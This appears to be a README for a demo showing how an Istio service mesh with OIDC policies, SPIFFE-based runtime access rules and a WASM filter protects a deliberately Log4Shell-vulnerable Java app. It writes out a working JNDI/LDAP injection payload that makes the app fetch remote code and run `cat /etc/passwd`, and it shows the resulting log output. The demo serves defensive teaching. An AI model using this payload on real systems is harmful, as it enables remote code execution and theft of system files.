# ZTA and DevSecOps for Cloud Native Applications demo

The following steps show how a Service Mesh can leverage the
features of a Security Kernel suitable for a Zero Trust Architecture
Platform. We will see:

* How a service mesh leverages **runtime identities** to protect
  service-to-service communications.
* How it can enforce **user identity based policies** and integrate with
  external or corporate Identity Providers.
* How policy is **enforced at the application level**, not only at the
  perimeter.
* How **targeted application policies** can be applied to affect only a subset
  of the applications in the mesh.

The demo consists of a [Java application](vulnerable-app) that is vulnerable to the `Log4Shell`
exploit. We will use the service mesh to enforce that access is authenticated on the
corporate Identity Provider, that only the right users and local services can access
the application, and that malicious payloads that trigger the `Log4Shell` exploit
are rejected.

## Install the demo environment

Before starting, install the demo environment following the instructions
in the [k8s/README.md](k8s/README.md) file.

## 1. Access the vulnerable application

Once you have deployed the demo environment you will be able to access the vulnerable
application at:

* `https://<your app DNS name>` - if you used the `gke` mode.
* `https://localhost:8443` - if you used the `local` mode.

You will see something like this:

```
Welcome, anonymous!
```

## 2. Enforce user identities

We don't want to allow unauthenticated users to access our application, so let's
apply a policy that configures the ingress gateway to require authentication against
the corporate identity Provider:

```
$ kubectl apply -f config/oidc-policy.yaml
```

If you inspect [the policy](config/oidc-policy.yaml) file you'll see that it applies to the `istio-ingressgateway`
and that it uses a `CUSTOM` target that delegates to the `authservice-grpc` provider.
The provider is configured in The Istio global mesh config that you can check with:

```
$ kubectl -n istio-system describe configmap istio
```

Once the policy is applied you can refresh the browser and you will be redirected to the
Identity Provider login page. After accepting in the consent screen and logging in, you'll
see something like:

```
Welcome, Ignasi!


Authenticated with token:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkRGRWVyODZqY2lRQTNfUVdETkE3MyJ9.eyJuaWNrbmFtZSI6ImlnbmFzaSt0ZXN0IiwibmFtZSI6IklnbmFzaSIsInBpY3R1cmUiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci8wNDRjMjU1MDk4NDE2M2M5OTQ3N2NkM2QyYjY0NWViND9zPTQ4MCZyPXBnJmQ9aHR0cHMlM0ElMkYlMkZjZG4uYXV0aDAuY29tJTJGYXZhdGFycyUyRmlnLnBuZyIsInVwZGF0ZWRfYXQiOiIyMDIyLTAxLTIzVDEwOjQyOjA2Ljg2NVoiLCJlbWFpbCI6ImlnbmFzaSt0ZXN0QHRldHJhdGUuaW8iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6Ly9uYWN4LWRtei5ldS5hdXRoMC5jb20vIiwic3ViIjoiYXV0aDB8NjFlN2Y0NWE3NmRjM2EwMDZhYWU1MGRiIiwiYXVkIjoiZHl5VzBtZTRMcThuM3RZMzBGYXR1RFFGWHB0WnZtNG8iLCJpYXQiOjE2NDI5MzQ1MjcsImV4cCI6MTY0Mjk3MDUyNywibm9uY2UiOiJsOUV4dW1EUUZQc3Z4VzJ1YkhSUHpiUDA1aFJuYnQ1dFBKNXJaRXVrSFlvIn0.AUr-S54HmRosQaHLFN99hxj1eP1NyDkk_42Bihlbh5OyQdTba-J_KYwWqUHPYdry8RQmHzYz6moDH3hynV5TRCDP0TNzCc9Y6eYoQmT0U59ZeKL1d38XMmGdTBTbzwMCRKoGf4wyopBPsFsIE2tH4iUMBiL7uKw_0kgjOr2UxJcUQR7bPVyvRSXIanxdrrtSWgpBdibAZ80c-z2V7m9uWJM8Tz_SjVwVm1PiXh_nkptFnWfq-i8J_aMNpDLU_RIn2D4nz_omBLdvSRQYjKyFMUIQZ8Huctpx-bKcBJFHT7l2QFjFMyaB00GKFLbsFCk3EDNeWQ8E8a8nn4fPooabbg
```

## 3. Enforce runtime access

Now we have configured our ingress to require an user login. We could have applied this policy
directly to the application sidecar, but for the demo purposes we'll do it just at the ingress level.

This means that any other service in the cluster could directly reach the application withot going through
the ingress. We can check it by launching a new pod and accessing the app as follows:

```
$ kubectl run tmp-shell --rm -i --tty --image nicolaka/netshoot -- /bin/bash
bash-5.1# curl http://vulnerable:8080
Welcome, anonymous!
bash-5.1# exit
```

Let's create a runtime policy that enforces that our application can only be reached from the ingress gateway.
Services in the cluster will no longer have direct access to it:

```
$ kubectl apply -f config/runtime-authn.yaml
```

If you inspect [the contents of the policy](config/runtime-authn.yaml) you'll see that it applies to the `vulnerable` application and that
it only allows access from a specific source principal. That source principal matches the
[SPIFEE identity](https://spiffe.io/docs/latest/spiffe-about/spiffe-concepts/#spiffe-id) of the Istio Ingress Gateway.

We can now try to directly access the application again from inside the cluster:

```
$ kubectl run tmp-shell --rm -i --tty --image nicolaka/netshoot -- /bin/bash
bash-5.1# curl http://vulnerable:8080
RBAC: access denied
bash-5.1# exit
```

Now we get an access denied, because the proxy sidecar in the application pod is rejecting the connection since the
runtime identity presented by our workload does not match the configured one.

## 4. Targeted application policy

The deployed Java application is vulnerable to `Log4Shell`, as it uses a Java and `log4j` versions vulnerable to the
popular CVEs. It logs the information in the JWT token without sanitizing it first, so it is easy to trigger it. To
demonstrate the attach, let's inject some malicious payloads in the token by setting some claims in our User profile:

* In the Auth0 amnagement console, go to **Users Management > Users**. Select your user and **Edit** the **Name** field.
  Put the following value and save: `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
* Open a new Browser window in incognito mode (to make sure there are no cookies, etc) adn log in again. You'll see a normal
  output:
  ```
  Welcome, ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}!
  
  Authenticated with token:
  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkRGRWVyODZqY2lRQTNfUVdETkE3MyJ9.eyJuaWNrbmFtZSI6ImlnbmFzaSt0ZXN0IiwibmFtZSI6IiR7am5kaTpsZGFwOi8vbG9nNHNoZWxsOjEzODkvZXhlYy9ZMkYwSUM5bGRHTXZjR0Z6YzNka0NnPT19IiwicGljdHVyZSI6Imh0dHBzOi8vcy5ncmF2YXRhci5jb20vYXZhdGFyLzA0NGMyNTUwOTg0MTYzYzk5NDc3Y2QzZDJiNjQ1ZWI0P3M9NDgwJnI9cGcmZD1odHRwcyUzQSUyRiUyRmNkbi5hdXRoMC5jb20lMkZhdmF0YXJzJTJGaWcucG5nIiwidXBkYXRlZF9hdCI6IjIwMjItMDEtMjRUMDg6MjM6NDguODY5WiIsImVtYWlsIjoiaWduYXNpK3Rlc3RAdGV0cmF0ZS5pbyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL25hY3gtZG16LmV1LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw2MWU3ZjQ1YTc2ZGMzYTAwNmFhZTUwZGIiLCJhdWQiOiJkeXlXMG1lNExxOG4zdFkzMEZhdHVEUUZYcHRadm00byIsImlhdCI6MTY0MzAxMjYyOSwiZXhwIjoxNjQzMDQ4NjI5LCJub25jZSI6IlQ5c2Q2LTZsNDlNVGRkUXFOLVJkeEplYmMwS1VsNk1OOVJmRWtkMVZVWjgifQ.FUi8ydGHDksc_B6YfmE-xCmSvdfOtroxJ5MOp5aern-JK3Qrcm0lYo4NNcxRdDg65AbS93hklexBRLBzfTd5B8jopiyzqmznMtafxV9rrH_ZS2-oBrfc-soLQf0r9d8T0tTnnidtfAbPSwNyv5zKiFHXxHGHoX-x6wjZahCt-pKk4uoCdTDGgCp2751yXF1FJSLcC8v8kiSC9lZhm7xJxVFvP19zZ30PadD9b_QOu3Xs-yOz2LxCXCXImQZvfuCV2YFOvVGimfKz35WeEf5RAeJZkxoHN6G3oXnbEwgIAdAl6r68Gj2LUbloy8XvKgJk7IIcsSlAwETiiPWdemP3ag
  ```
* However, if we inspect the application container logs we'll see something like:
  ```
  08:23:49.369 [qtp1316061703-14] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - user resolved to: pwned!
  08:23:49.535 [qtp1316061703-16] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - token payload: {"sub":"auth0|61e7f45a76dc3a006aae50db","aud":"dyyW0me4Lq8n3tY30FatuDQFXptZvm4o","email_verified":true,"updated_at":"2022-01-24T08:23:48.869Z","nickname":"ignasi+test","name":"${jndi:ldap:\/\/log4shell:1389\/exec\/Y2F0IC9ldGMvcGFzc3dkCg==}","iss":"https:\/\/nacx-dmz.eu.auth0.com\/","exp":1643048629,"iat":1643012629,"nonce":"T9sd6-6l49MTddQqN-RdxJebc0KUl6MN9RfEkd1VUZ8","picture":"https:\/\/s.gravatar.com\/avatar\/044c2550984163c99477cd3d2b645eb4?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fig.png","email":"ignasi+test@tetrate.io"}
  /!\ /!\ /!\ You have been pwned!
  /!\ /!\ /!\ RCE exploit loaded
  /!\ /!\ /!\ Executing: cat /etc/passwd
  
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
  systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
  systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
  systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
  messagebus:x:104:108::/var/run/dbus:/bin/false
  
  08:23:49.537 [qtp1316061703-16] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - user resolved to: pwned!
  ```

At this point, the vulnerable application has processed the mailitious `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
payload in the `name` claim of the JWT token, downloaded the exploit from `log4shell:1389`, and executed the `cat /etc/passwd` command
that comes base64-encoded in the payload.

To prevent this, we will deploy the [WASM patch](wasm-patch) to all the Java applications in the environment:

```
envsubst < config/wasm-patch.yaml | kubectl apply -f -
```

The [patch file](config/wasm-patch.yaml) sets the `selectors` so that the patch is deployed only to Java applications, and it instructs
the mesh to apply the WASM filter to every HTTP request. We can now trefresh the page and this time we'll see the following:

```
Access Denied
```

We can check that the sidecar proxy in the application pod is rejecting hte traffic via the WASM plugin we jsut deployed:

```
kubectl -n zta-demo logs -l app=vulnerable -c istio-proxy | grep wasm
2022-01-24T08:35:18.968121Z	info	envoy wasm	wasm log zta-demo.log4shell-patch: access denied for: ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}
```
